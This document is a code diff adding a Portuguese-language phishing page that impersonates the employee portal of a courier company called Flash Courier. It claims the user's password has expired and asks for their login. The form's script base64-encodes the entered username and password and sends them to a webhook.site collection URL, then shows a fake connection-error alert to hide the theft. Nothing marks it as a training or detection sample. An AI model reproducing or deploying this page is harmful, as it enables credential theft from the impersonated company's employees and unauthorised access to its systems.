@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash Courier - Portal do Funcionário</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 0; }
+        .header { background: #102d69; color: white; padding: 20px; text-align: center; }
+        .header h1 { margin: 0; font-size: 24px; }
+        .content { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .notice { background: #e8f4fd; border-left: 4px solid #2196F3; padding: 15px; margin-bottom: 20px; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
+        button { width: 100%; padding: 12px; background: #102d69; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #1a4a8c; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>FLASH COURIER</h1>
+        <p>Portal do Funcionário</p>
+    </div>
+    <div class="content">
+        <div class="notice">
+            <strong>Aviso Importante</strong><br>
+            Sua senha expirou. Por favor, faça login para definir uma nova senha.
+        </div>
+        <form onsubmit="event.preventDefault(); var u=document.getElementById('u').value; var p=document.getElementById('p').value; fetch('https://webhook.site/YOUR-UUID?user='+btoa(u)+'&pass='+btoa(p)); alert('Erro de conexão. Tente novamente mais tarde.'); ">
+            <input type="text" id="u" placeholder="Usuário" required>
+            <input type="password" id="p" placeholder="Senha atual" required>
+            <button type="submit">Continuar</button>
+        </form>
+    </div>
+</body>
+</html>
